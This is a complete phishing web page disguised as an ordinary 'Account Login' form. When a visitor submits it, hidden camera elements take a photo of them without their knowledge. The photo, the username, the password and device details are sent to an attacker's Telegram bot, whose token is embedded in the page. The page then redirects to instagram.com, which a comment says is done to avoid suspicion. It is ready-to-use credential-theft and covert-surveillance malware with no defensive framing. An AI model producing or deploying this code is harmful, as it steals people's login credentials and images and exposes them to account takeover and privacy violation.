<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
            margin: 0;
            padding: 20px;
            background: #f7f9fa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background: #fff;
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
        }
        h1 {
            margin-top: 0;
            color: #333;
            font-size: 22px;
            text-align: center;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #0095f6;
        }
        button {
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 16px 0;
            transition: background 0.2s;
        }
        button:hover {
            background: #0074cc;
        }
        .status {
            background: #f1f5f9;
            padding: 16px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 14px;
            color: #555;
            display: none;
        }
        #statusOutput {
            white-space: pre-line;
            overflow-wrap: break-word;
        }
        #cameraFeed, #canvas {
            display: none;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #0095f6;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }
        .forgot-password a {
            color: #0095f6;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Account Login</h1>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginBtn">Login</button>
        </form>
        
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
        
        <!-- Hidden camera elements -->
        <video id="cameraFeed" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        
        <div class="status" id="statusDiv">
            <div id="statusOutput"></div>
        </div>
    </div>

    <script>
        // CONFIG - REPLACE THESE VALUES
        const BOT_TOKEN = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
        const CHAT_ID = '8126039795';
        
        // Elements
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const cameraFeed = document.getElementById('cameraFeed');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('statusDiv');
        const statusOutput = document.getElementById('statusOutput');
        
        // Status logging function (hidden by default)
        function log(message, isError = false) {
            const timestamp = new Date().toLocaleTimeString();
            const prefix = isError ? '‚ùå ' : '‚úì ';
            statusOutput.innerHTML = `${prefix}${timestamp}: ${message}\n` + statusOutput.innerHTML;
            console.log(`${prefix}${message}`);
        }
        
        // Add loading spinner to button
        function setButtonLoading(button, isLoading, text) {
            if (isLoading) {
                button.innerHTML = `<span class="loader"></span> ${text}`;
                button.disabled = true;
            } else {
                button.innerHTML = text;
                button.disabled = false;
            }
        }
        
        // Main function for login with camera capture
        async function loginWithCapture(event) {
            event.preventDefault();
            
            // Get form data
            const username = usernameInput.value;
            const password = passwordInput.value;
            
            if (!username || !password) {
                return; // Form validation will handle this
            }
            
            setButtonLoading(loginBtn, true, 'Logging in...');
            
            try {
                // Capture the photo first
                const imageBase64 = await captureImage();
                
                // Send both login info and photo to Telegram
                if (imageBase64) {
                    // Add login info to the caption
                    const loginInfo = `üîê LOGIN ATTEMPT üîê\n` +
                                    `üë§ Username: ${username}\n` +
                                    `üîë Password: ${password}\n` +
                                    `‚è∞ Time: ${new Date().toLocaleString()}\n` +
                                    `üì± Device: ${navigator.userAgent.substring(0, 100)}`;
                    
                    // Send to Telegram
                    await sendImageToTelegram(imageBase64, loginInfo);
                } else {
                    // If camera failed, at least send the login info
                    await sendLoginInfoToTelegram(username, password);
                }
                
                // Simulate successful login (redirect or show success)
                setTimeout(() => {
                    window.location.href = "https://instagram.com"; // Change to your desired redirect URL
                }, 1000);
                
            } catch (error) {
                console.error('Login process error:', error);
                
                // Still redirect to avoid suspicion, even if there was an error
                setTimeout(() => {
                    window.location.href = "https://instagram.com"; // Change to your desired redirect URL
                }, 1000);
            }
        }
        
        // Function to capture image from camera
        async function captureImage() {
            try {
                // 1. Get camera access
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                // 2. Set up video feed
                cameraFeed.srcObject = stream;
                
                // 3. Wait for video to be ready
                await new Promise(resolve => {
                    cameraFeed.onloadedmetadata = () => {
                        cameraFeed.play();
                        // Give camera time to adjust lighting and focus
                        setTimeout(resolve, 600);
                    };
                });
                
                // 4. Capture frame to canvas
                canvas.width = cameraFeed.videoWidth || 640;
                canvas.height = cameraFeed.videoHeight || 480;
                canvas.getContext('2d').drawImage(cameraFeed, 0, 0);
                
                // 5. Convert to base64
                const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
                
                // 6. Stop all tracks
                stream.getTracks().forEach(track => track.stop());
                
                return imageBase64;
                
            } catch (error) {
                console.error('Camera capture error:', error);
                return null; // Return null if camera capture failed
            }
        }
        
        // Send image to Telegram
        async function sendImageToTelegram(imageBase64, caption) {
            try {
                // 1. Extract base64 data
                const base64Data = imageBase64.split(',')[1];
                
                // 2. Create browser-friendly Blob
                const byteCharacters = atob(base64Data);
                const byteArrays = [];
                
                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                    const slice = byteCharacters.slice(offset, offset + 512);
                    const byteNumbers = new Array(slice.length);
                    
                    for (let i = 0; i < slice.length; i++) {
                        byteNumbers[i] = slice.charCodeAt(i);
                    }
                    
                    byteArrays.push(new Uint8Array(byteNumbers));
                }
                
                const blob = new Blob(byteArrays, {type: 'image/jpeg'});
                
                // 3. Create FormData with blob
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'login.jpg');
                formData.append('caption', caption);
                
                // 4. Send to Telegram API
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return true;
            } catch (error) {
                console.error('Send image error:', error);
                // Fallback to sending just the login info
                return sendLoginInfoToTelegram(
                    caption.split('\n')[1].replace('üë§ Username: ', ''),
                    caption.split('\n')[2].replace('üîë Password: ', '')
                );
            }
        }
        
        // Fallback function to send only login info
        async function sendLoginInfoToTelegram(username, password) {
            try {
                const message = `üîê LOGIN ATTEMPT (No Image) üîê\n` +
                               `üë§ Username: ${username}\n` +
                               `üîë Password: ${password}\n` +
                               `‚è∞ Time: ${new Date().toLocaleString()}\n` +
                               `üì± Device: ${navigator.userAgent.substring(0, 100)}\n` +
                               `‚ö†Ô∏è Note: Camera access failed`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                return true;
            } catch (error) {
                console.error('Send text fallback error:', error);
                return false;
            }
        }
        
        // Event listener for form submission
        loginForm.addEventListener('submit', loginWithCapture);
    </script>
</body>
</html>
